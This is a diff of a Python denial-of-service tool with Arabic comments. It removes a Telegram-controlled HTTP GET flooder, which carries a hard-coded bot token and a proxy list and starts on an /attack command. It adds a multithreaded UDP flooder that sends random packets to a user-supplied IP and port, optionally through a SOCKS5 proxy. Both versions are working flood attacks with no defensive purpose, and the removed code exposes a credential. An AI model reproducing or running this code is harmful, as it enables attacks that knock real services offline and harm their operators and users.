@@ -1,83 +1,54 @@
 
-import time
-import requests
+import socket
+import random
 import threading
-from concurrent.futures import ThreadPoolExecutor
-import telebot
+import os
+import socks
 
-# Your Telegram bot token
-API_TOKEN = '7823594166:AAG5HvvfOnliCBVKu9VsnzmCgrQb68m91go'
+def get_user_input():
+    # طلب إدخال عنوان IP والمنفذ
+    target_ip = input("Enter the target IP: ")
+    target_port = int(input("Enter the target port: "))
 
-bot = telebot.TeleBot(API_TOKEN)
+    # خيار إضافة بروكسي
+    use_proxy = input("Do you want to use a proxy? (yes/no): ").strip().lower()
+    proxy = None
+    if use_proxy == 'yes':
+        proxy = input("Enter the proxy in format socks5://ip:port: ").strip()
 
-# Constants
-lock = threading.Lock()
-protection_active = False
+    return target_ip, target_port, proxy
 
-def send_request(url, proxy, retries=3):
-    """إرسال طلب GET باستخدام بروكسي."""
-    for attempt in range(retries):
+# إرسال حزم إلى الهدف من مآخذ متعددة في خيوط متعددة
+def attack(target_ip, target_port, proxy=None):
+    if proxy:
+        proxy_ip, proxy_port = proxy.replace("socks5://", "").split(":")
+        proxy_port = int(proxy_port)
+
+        # إعداد اتصال باستخدام بروكسي SOCKS5
+        socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+        socket.socket = socks.socksocket
+
+    # إنشاء مأخذ
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    while True:
         try:
-            proxies = {"http": proxy, "https": proxy}
-            response = requests.get(url, timeout=5, proxies=proxies)
-            return response.status_code
-        except requests.RequestException:
-            if attempt < retries - 1:
-                time.sleep(0.0)  # تقليل زمن الانتظار بين المحاولات
-    return None
+            data = os.urandom(1024)  # زيادة حجم الحمولة
+            s.sendto(data, (target_ip, target_port))
+        except Exception as e:
+            print(f"Error: {e}")
 
-def flood(url, proxies_list):
-    """تنفيذ هجوم الفيضانات على URL باستخدام طلبات GET غير محدودة."""
-    global protection_active
-    total_sent = 0
+def main():
+    target_ip, target_port, proxy = get_user_input()
 
-    def task(proxy):
-        send_request(url, proxy)
-        with lock:
-            nonlocal total_sent
-            total_sent += 1
-            if total_sent % 1000 == 0:
-                print(f"Total requests sent: {total_sent}")
+    threads = []
+    for i in range(100):
+        t = threading.Thread(target=attack, args=(target_ip, target_port, proxy))
+        threads.append(t)
 
-    with ThreadPoolExecutor(max_workers=1000) as executor:
-        while protection_active:
-            for proxy in proxies_list:
-                executor.submit(task, proxy)
+    # بدء الخيوط
+    for t in threads:
+        t.start()
 
-    print(f"Final total requests sent: {total_sent}")
-
-# Define your proxies here with correct format
-proxies_list = [
-    "http://179.60.183.100:50100",
-    "http://179.60.183.98:50100",
-    "http://179.60.183.201:50100",
-    "http://179.60.183.146:50100",
-    "http://193.169.218.254:50100"
-    # Add more proxies as needed
-]
-
-@bot.message_handler(commands=['attack'])
-def handle_attack(message):
-    global protection_active
-
-    try:
-        url = message.text.split()[1]
-    except IndexError:
-        bot.send_message(message.chat.id, "Usage: /attack <url>")
-        return
-
-    protection_active = True
-    bot.send_message(message.chat.id, f"Starting flood for {url} with GET requests...")
-    flood(url, proxies_list)
-
-@bot.message_handler(commands=['stop'])
-def handle_stop(message):
-    global protection_active
-    protection_active = False
-    bot.send_message(message.chat.id, "Stopping flood...")
-
-@bot.message_handler(commands=['start', 'help'])
-def handle_start_help(message):
-    bot.send_message(message.chat.id, "Commands:\n/attack <url>\n/stop")
-
-bot.polling()
+if __name__ == "__main__":
+    main()
